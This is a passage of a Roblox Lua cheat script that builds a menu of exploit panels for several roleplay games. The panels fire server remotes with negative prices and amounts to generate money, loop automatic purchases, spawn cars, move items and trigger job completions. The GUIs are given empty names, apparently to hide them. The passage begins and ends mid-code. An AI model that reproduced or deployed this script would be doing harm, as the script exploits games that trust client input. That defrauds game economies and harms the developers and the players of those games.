title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "URBAN CITY V3"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- List of items to buy
local items = {
    {"Suppressed Pistols", "Suppressed Pistols"},
    {"Deagle", "Deagle"}
}

local selectedItem = nil

-- Dropdown Button
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Item"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Roboto
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

-- Dropdown frame (auto height)
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #items * 30)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

-- Buttons for dropdown
for i, item in ipairs(items) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 30)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 30)
    btn.Text = item[1]
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedItem = item[2]
        dropdown.Text = item[1]
        dropdownFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Auto Buy Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, 85 + (#items * 30) + 10)
toggle.Text = "Start Auto Buy"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.Roboto
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

local isAutoBuying = false

toggle.MouseButton1Click:Connect(function()
    isAutoBuying = not isAutoBuying
    toggle.Text = isAutoBuying and "Stop Auto Buy" or "Start Auto Buy"

    while isAutoBuying do
        if selectedItem then
            ReplicatedStorage.GunStoreFolder.BuyTool:FireServer(selectedItem, -0)
            print("Auto-buying " .. selectedItem)
        end
        task.wait(5)
    end
end)

-- Toggle GUI visibility with RightShift
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

local function addMainMenuButton(text, callback)
	local panel = allTabPanels["ROLEPLAY MENU 2"]
	if not panel then return end
	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(245,245,245),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.Roboto,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})

	btn.MouseEnter:Connect(function()
		local t = getThemeColors()
		local accent = t.accent or Color3.new(1,1,1)
		local hover = t.bg:Lerp(accent, 0.50)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = hover}):Play()
	end)
	btn.MouseLeave:Connect(function()
		local t = getThemeColors()
		local accent = t.accent or Color3.new(1,1,1)
		local base = t.bg:Lerp(accent, 0.32)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = base}):Play()
	end)

	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 8 Buttons in Main Menu
addMainMenuButton("BAGONG BARYO SPAWNCAR (MONSY)", function()
	local player = game.Players.LocalPlayer
local rs = game:GetService("ReplicatedStorage")

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Main Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 250, 0, 230)
frame.Position = UDim2.new(0.5, -125, 0.5, -115)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

-- Rounded Corners
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 15)
corner.Parent = frame

-- Title
local title = Instance.new("TextLabel")
title.Text = "Choose Your Vehicle"
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 18
title.Parent = frame

-- Button function (each with its own car name)
local function createButton(displayName, carName, posY)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.8, 0, 0, 35)
    btn.Position = UDim2.new(0.1, 0, 0, posY)
    btn.Text = displayName
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.fromRGB(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 16
    btn.Parent = frame

    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 8)
    btnCorner.Parent = btn

    btn.MouseEnter:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    end)
    btn.MouseLeave:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    end)

    btn.MouseButton1Click:Connect(function()
        local args = {
            [1] = carName
        }

        rs:WaitForChild("Car Dealership System", 9e9)
            :WaitForChild("Events", 9e9)
            :WaitForChild("SpawnCarEvent", 9e9)
            :FireServer(unpack(args))
    end)
end

-- Create Buttons
createButton("Civic", "Civic", 50)
createButton("Subaru", "subaru", 90)
createButton("CarName", "CarName", 130)
createButton("Dirtbike", "Dirtbike", 170) 
end)

--// 8 Buttons in Main Menu
addMainMenuButton("BAGONG BARYO REFRESH (MONSY)", function()
	local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

-- GUI
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Main Frame — PURE WHITE
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 180, 0, 100)
frame.Position = UDim2.new(0.5, -90, 0.5, -50)
frame.BackgroundColor3 = Color3.new(1, 1, 1)        -- PURE WHITE
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

-- Rounded Corners
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = frame

-- Title — BLACK TEXT
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundTransparency = 1                  -- WALANG BACKGROUND
title.Text = "Auto Refresh"
title.TextColor3 = Color3.new(0,0,0)               -- BLACK TEXT
title.Font = Enum.Font.Roboto
title.TextSize = 18
title.Parent = frame

-- Refresh Button — LIGHT GRAY (para kita) + BLACK TEXT
local refreshButton = Instance.new("TextButton")
refreshButton.Size = UDim2.new(0.8, 0, 0.4, 0)
refreshButton.Position = UDim2.new(0.1, 0, 0.45, 0)
refreshButton.BackgroundColor3 = Color3.fromRGB(230, 230, 230)  -- LIGHT GRAY
refreshButton.Text = "Refresh"
refreshButton.TextColor3 = Color3.new(0,0,0)                    -- BLACK TEXT
refreshButton.Font = Enum.Font.Roboto
refreshButton.TextSize = 16
refreshButton.BorderSizePixel = 1
refreshButton.BorderColor3 = Color3.new(0,0,0)                 -- BLACK BORDER
refreshButton.Parent = frame

-- Button rounded
local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 10)
buttonCorner.Parent = refreshButton

-- Hover effect (mas maganda pa rin)
refreshButton.MouseEnter:Connect(function()
    refreshButton.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
end)

refreshButton.MouseLeave:Connect(function()
    refreshButton.BackgroundColor3 = Color3.fromRGB(230, 230, 230)
end)

-- Button Function (EXACT SAME)
refreshButton.MouseButton1Click:Connect(function()
    local args = { [1] = "Boy" }
    ReplicatedStorage:WaitForChild("SaveCharacterEvent", 9e9):FireServer(unpack(args))
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("THE BILLIONARE CITY AUTO OXY (MONSY)", function()
	local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local oxyRemote = ReplicatedStorage:WaitForChild("OxyComplete")

--// ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = ""
screenGui.Parent = player:WaitForChild("PlayerGui")

--// Main Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 250, 0, 120)
frame.Position = UDim2.new(0.5, -125, 0.5, -60)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255) -- ultra black
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui
frame.AnchorPoint = Vector2.new(0.5, 0.5)

--// Rounded corners
local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 15)
uiCorner.Parent = frame

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Text = "AUTO OXY"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 22
title.Parent = frame

--// Button
local oxyButton = Instance.new("TextButton")
oxyButton.Size = UDim2.new(0, 200, 0, 50)
oxyButton.Position = UDim2.new(0.5, -100, 0, 60)
oxyButton.BackgroundColor3 = Color3.fromRGB(255,255,255) -- full black
oxyButton.Text = "OXY"
oxyButton.TextColor3 = Color3.fromRGB(0,0,0)
oxyButton.Font = Enum.Font.Roboto
oxyButton.TextSize = 20
oxyButton.Parent = frame

--// Button rounded corners
local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 12)
buttonCorner.Parent = oxyButton

--// Button click function
oxyButton.MouseButton1Click:Connect(function()
    oxyRemote:FireServer("APOY", -1)
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("BAGONG BARYO REFRESH WAYPOINT (MONSY)", function()
	local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

-- Variables
local savedWaypoint = nil

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Main Frame — PURE WHITE
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 200, 0, 170)
frame.Position = UDim2.new(0.5, -100, 0.5, -85)
frame.BackgroundColor3 = Color3.new(1, 1, 1)        -- PURE WHITE
frame.BorderSizePixel = 0
frame.BackgroundTransparency = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

-- Rounded corners
local corner = Instance.new("UICorner", frame)
corner.CornerRadius = UDim.new(0, 12)

-- Title — BLACK TEXT
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 35)
title.BackgroundTransparency = 1
title.Text = "AUTO WAYPOINT"
title.TextColor3 = Color3.new(0,0,0)                -- BLACK TEXT
title.Font = Enum.Font.Roboto
title.TextSize = 18
title.Parent = frame

-- Function to create buttons (WHITE THEME)
local function createButton(text, order)
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0.8, 0, 0, 35)
    button.Position = UDim2.new(0.1, 0, 0, 40 + (order * 40))
    button.BackgroundColor3 = Color3.fromRGB(240, 240, 240)  -- LIGHT GRAY (para kita)
    button.TextColor3 = Color3.new(0,0,0)                    -- BLACK TEXT
    button.Text = text
    button.Font = Enum.Font.Roboto
    button.TextSize = 16
    button.BorderSizePixel = 1
    button.BorderColor3 = Color3.new(0,0,0)                  -- BLACK BORDER

    local btnCorner = Instance.new("UICorner", button)
    btnCorner.CornerRadius = UDim.new(0, 10)
    button.Parent = frame
    return button
end

-- Create Buttons
local setWaypointBtn = createButton("Set Waypoint", 0)
local refreshBtn = createButton("Refresh", 1)
local deleteWaypointBtn = createButton("Delete Waypoint", 2)

--// BUTTON FUNCTIONS (EXACT SAME)

-- SET WAYPOINT
setWaypointBtn.MouseButton1Click:Connect(function()
    local char = player.Character or player.CharacterAdded:Wait()
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if hrp then
        savedWaypoint = hrp.Position
        player:WaitForChild("PlayerGui"):SetCore("SendNotification", {
            Title = "Waypoint Set",
            Text = "Respawn point saved!",
            Duration = 2
        })
    end
end)

-- REFRESH BUTTON
refreshBtn.MouseButton1Click:Connect(function()
    local args = { [1] = "Boy" }
    ReplicatedStorage:WaitForChild("SaveCharacterEvent", 9e9):FireServer(unpack(args))
end)

-- DELETE WAYPOINT
deleteWaypointBtn.MouseButton1Click:Connect(function()
    savedWaypoint = nil
    player:WaitForChild("PlayerGui"):SetCore("SendNotification", {
        Title = "Waypoint Deleted",
        Text = "Respawn point removed!",
        Duration = 2
    })
end)

--// RESPAWN HANDLER (EXACT SAME)
player.CharacterAdded:Connect(function(char)
    if savedWaypoint then
        char:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(savedWaypoint)
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CAVITE ROLEPLAY BLACK MARKET (MONSY)", function()
	local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 400)
frame.Position = UDim2.new(0.5, -150, 0.5, -200)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "CAVITE ROLEPLAY BM"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- Dropdown (Select Gun)
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Roboto
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local gunList = {"Silenced Pistol", "Tactical Knife", "Skorpion", "Heavy Vest", "Heavy Helmet", "MEDKIT", "-"}

local selectedGun = nil

-- Dropdown Menu
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #gunList * 25)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

for i, gun in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 25)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 25)
    btn.Text = gun
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gun
        dropdown.Text = gun
        dropdownFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Preset Buttons (Aligned)
local buttonSpacing = 5
local buttonWidth = (300 - 40 - (buttonSpacing * 2)) / 3
local buttonYOffset = 95 + #gunList * 25

local amountBox = Instance.new("TextBox")

for i, data in ipairs({
    {Label = "Give 100K", Value = -100000},
    {Label = "Give 1M", Value = -1000000},
    {Label = "Give 10M", Value = -10000000},
}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, buttonWidth, 0, 30)
    btn.Position = UDim2.new(0, 10 + (buttonWidth + buttonSpacing) * (i - 1), 0, buttonYOffset)
    btn.Text = data.Label
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = frame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        amountBox.Text = tostring(data.Value)
    end)
end

-- Amount Box
amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, buttonYOffset + 40)
amountBox.PlaceholderText = "Enter Amount (PUBLIC ENEMY CMD)"
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.new(0,0,0)
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.Font = Enum.Font.Roboto
amountBox.TextSize = 12
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

-- Auto Give Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, buttonYOffset + 80)
toggle.Text = "Start Auto Give"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.Roboto
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- 🧠 NEW SYSTEM (replaces old Purchase event)
local giving = false
toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"

    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            local args = {
                [1] = tonumber(amountBox.Text),
                [2] = selectedGun
            }
            game:GetService("ReplicatedStorage"):WaitForChild("BM_Storage", 9e9)
                :WaitForChild("Remotes", 9e9)
                :WaitForChild("Buy", 9e9)
                :FireServer(unpack(args))
        end
        task.wait(1)
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("SPAWN EVOX DOMINION HP (MONSY)", function()
	local args = {
    [1] = "EvoX";
    [2] = "Garage_5";
}

game:GetService("ReplicatedStorage"):WaitForChild("CarSystem", 9e9):WaitForChild("Remotes", 9e9):WaitForChild("SpawnCar", 9e9):InvokeServer(unpack(args))
end)

--// 8 Buttons in Main Menu
addMainMenuButton("DOMINION STORAGE SYSTEM MOVE (MONSY)", function()
	local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Helper: find remotes
local function getRemotes()
    local aaron = ReplicatedStorage:FindFirstChild("Aaron")
    if not aaron then return nil end
    local shared = aaron:FindFirstChild("Shared")
    if not shared then return nil end
    return shared:FindFirstChild("Remotes")
end

-- ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = ""
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

-- Main Frame (ALL BLACK, Rounded, Draggable)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 360, 0, 200)
frame.Position = UDim2.new(0.5, -180, 0.3, -100)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.Parent = screenGui

local frameCorner = Instance.new("UICorner")
frameCorner.CornerRadius = UDim.new(0, 16)
frameCorner.Parent = frame

-- Title Bar
local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 40)
titleBar.BackgroundColor3 = Color3.fromRGB(255,255,255)
titleBar.BorderSizePixel = 0
titleBar.Parent = frame

local titleBarCorner = Instance.new("UICorner")
titleBarCorner.CornerRadius = UDim.new(0, 16)
titleBarCorner.Parent = titleBar

-- Centered Title: PUBLIC ENEMY
local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, -50, 1, 0)
titleLabel.Position = UDim2.new(0, 0, 0, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "PUBLIC ENEMY"
titleLabel.Font = Enum.Font.Roboto
titleLabel.TextSize = 22
titleLabel.TextColor3 = Color3.fromRGB(0,0,0)
titleLabel.TextXAlignment = Enum.TextXAlignment.Center
titleLabel.Parent = titleBar

-- Close Button (X) - WHITE
local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 36, 0, 36)
closeButton.Position = UDim2.new(1, -40, 0, 2)
closeButton.BackgroundTransparency = 1
closeButton.Text = "✕"
closeButton.Font = Enum.Font.Roboto
closeButton.TextSize = 18
closeButton.TextColor3 = Color3.fromRGB(0,0,0)
closeButton.Parent = titleBar

closeButton.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

-- Draggable Logic
local dragging = false
local dragInput, dragStart, startPos

local function updateInput(input)
    local delta = input.Position - dragStart
    frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

titleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

titleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and input == dragInput then
        updateInput(input)
    end
end)

-- Mode Button (CENTERED, BLACK + WHITE)
local mode = "Inventory"
local modeButton = Instance.new("TextButton")
modeButton.Size = UDim2.new(0, 160, 0, 32)
modeButton.Position = UDim2.new(0.5, -80, 0, 52)
modeButton.Text = "Mode: "..mode
modeButton.Font = Enum.Font.Roboto
modeButton.TextSize = 16
modeButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
modeButton.TextColor3 = Color3.fromRGB(0,0,0)
modeButton.BorderSizePixel = 1
modeButton.BorderColor3 = Color3.fromRGB(50, 50, 50)
modeButton.Parent = frame

local modeCorner = Instance.new("UICorner")
modeCorner.CornerRadius = UDim.new(0, 10)
modeCorner.Parent = modeButton

modeButton.MouseButton1Click:Connect(function()
    mode = (mode == "Inventory") and "Storage" or "Inventory"
    modeButton.Text = "Mode: "..mode
end)

-- Item Name Label & Box
local nameLabel = Instance.new("TextLabel")
nameLabel.Size = UDim2.new(0, 100, 0, 26)
nameLabel.Position = UDim2.new(0, 16, 0, 92)
nameLabel.BackgroundTransparency = 1
nameLabel.Text = "Item name:"
nameLabel.Font = Enum.Font.Roboto
nameLabel.TextSize = 15
nameLabel.TextColor3 = Color3.fromRGB(0,0,0)
nameLabel.TextXAlignment = Enum.TextXAlignment.Left
nameLabel.Parent = frame

local nameBox = Instance.new("TextBox")
nameBox.Size = UDim2.new(0, 200, 0, 32)
nameBox.Position = UDim2.new(0, 120, 0, 89)
nameBox.PlaceholderText = "- SP - AK47"
nameBox.Text = ""
nameBox.ClearTextOnFocus = false
nameBox.Font = Enum.Font.Roboto
nameBox.TextSize = 15
nameBox.TextColor3 = Color3.fromRGB(0,0,0)
nameBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
nameBox.BorderSizePixel = 1
nameBox.BorderColor3 = Color3.fromRGB(60, 60, 60)
nameBox.Parent = frame

local nameBoxCorner = Instance.new("UICorner")
nameBoxCorner.CornerRadius = UDim.new(0, 8)
nameBoxCorner.Parent = nameBox

-- Quantity Label & Box
local qtyLabel = Instance.new("TextLabel")
qtyLabel.Size = UDim2.new(0, 100, 0, 26)
qtyLabel.Position = UDim2.new(0, 16, 0, 130)
qtyLabel.BackgroundTransparency = 1
qtyLabel.Text = "Quantity:"
qtyLabel.Font = Enum.Font.Roboto
qtyLabel.TextSize = 15
qtyLabel.TextColor3 = Color3.fromRGB(0,0,0)
qtyLabel.TextXAlignment = Enum.TextXAlignment.Left
qtyLabel.Parent = frame

local qtyBox = Instance.new("TextBox")
qtyBox.Size = UDim2.new(0, 80, 0, 32)
qtyBox.Position = UDim2.new(0, 120, 0, 127)
qtyBox.PlaceholderText = "1"
qtyBox.Text = "1"
qtyBox.ClearTextOnFocus = false
qtyBox.Font = Enum.Font.Roboto
qtyBox.TextSize = 15
qtyBox.TextColor3 = Color3.fromRGB(0,0,0)
qtyBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
qtyBox.BorderSizePixel = 1
qtyBox.BorderColor3 = Color3.fromRGB(60, 60, 60)
qtyBox.Parent = frame

local qtyBoxCorner = Instance.new("UICorner")
qtyBoxCorner.CornerRadius = UDim.new(0, 8)
qtyBoxCorner.Parent = qtyBox

-- Move Button (CENTERED BELOW, BLACK + WHITE)
local moveButton = Instance.new("TextButton")
moveButton.Size = UDim2.new(0, 120, 0, 36)
moveButton.Position = UDim2.new(0.5, -60, 0, 155)
moveButton.Text = "Move"
moveButton.Font = Enum.Font.Roboto
moveButton.TextSize = 16
moveButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
moveButton.TextColor3 = Color3.fromRGB(0,0,0)
moveButton.BorderSizePixel = 1
moveButton.BorderColor3 = Color3.fromRGB(80, 80, 80)
moveButton.Parent = frame

local moveCorner = Instance.new("UICorner")
moveCorner.CornerRadius = UDim.new(0, 10)
moveCorner.Parent = moveButton

-- Status Label (CENTERED BELOW BUTTON)
local status = Instance.new("TextLabel")
status.Size = UDim2.new(0, 310, 0, 24)
status.Position = UDim2.new(0, 25, 0, 170)
status.BackgroundTransparency = 1
status.Text = ""
status.TextSize = 14
status.Font = Enum.Font.Roboto
status.TextColor3 = Color3.fromRGB(0,0,0)
status.TextXAlignment = Enum.TextXAlignment.Center
status.Visible = false
status.Parent = frame

-- Remote Function
local function callMoveRemote(targetMode, itemName, quantity)
    local remotes = getRemotes()
    if not remotes then return false, "Remotes not found" end
    local remoteName = (targetMode == "Inventory") and "MoveToInventory" or "MoveToStorage"
    local remote = remotes:FindFirstChild(remoteName)
    if not remote then return false, "Remote '"..remoteName.."' missing" end
    local ok, res = pcall(function()
        return remote:InvokeServer(itemName, quantity)
    end)
    return ok and true or false, ok and res or tostring(res)
end

-- Move Button Action
moveButton.MouseButton1Click:Connect(function()
    local item = nameBox.Text:gsub("^%s*(.-)%s*$", "%1")
    local q = tonumber(qtyBox.Text) or 0
    if item == "" or q <= 0 then
        status.Text = "Invalid input!"
        status.Visible = true
        task.delay(2, function() status.Visible = false end)
        return
    end
    status.Text = "Sending..."
    status.Visible = true
    local ok, res = callMoveRemote(mode, item, q)
    status.Text = ok and "Success!" or "Error: "..tostring(res)
    task.delay(2, function() status.Visible = false end)
end)
end)

addMainMenuButton("URBAN CITY V3 AUTO OXY (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local oxyRemote = ReplicatedStorage:WaitForChild("OxyComplete")

--// ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = ""
screenGui.Parent = player:WaitForChild("PlayerGui")

--// Main Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 250, 0, 120)
frame.Position = UDim2.new(0.5, -125, 0.5, -60)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255) -- ultra black
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui
frame.AnchorPoint = Vector2.new(0.5, 0.5)

--// Rounded corners
local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 15)
uiCorner.Parent = frame

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Text = "AUTO OXY"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 22
title.Parent = frame

--// Button
local oxyButton = Instance.new("TextButton")
oxyButton.Size = UDim2.new(0, 200, 0, 50)
oxyButton.Position = UDim2.new(0.5, -100, 0, 60)
oxyButton.BackgroundColor3 = Color3.fromRGB(255,255,255) -- full black
oxyButton.Text = "OXY"
oxyButton.TextColor3 = Color3.fromRGB(0,0,0)
oxyButton.Font = Enum.Font.Roboto
oxyButton.TextSize = 20
oxyButton.Parent = frame

--// Button rounded corners
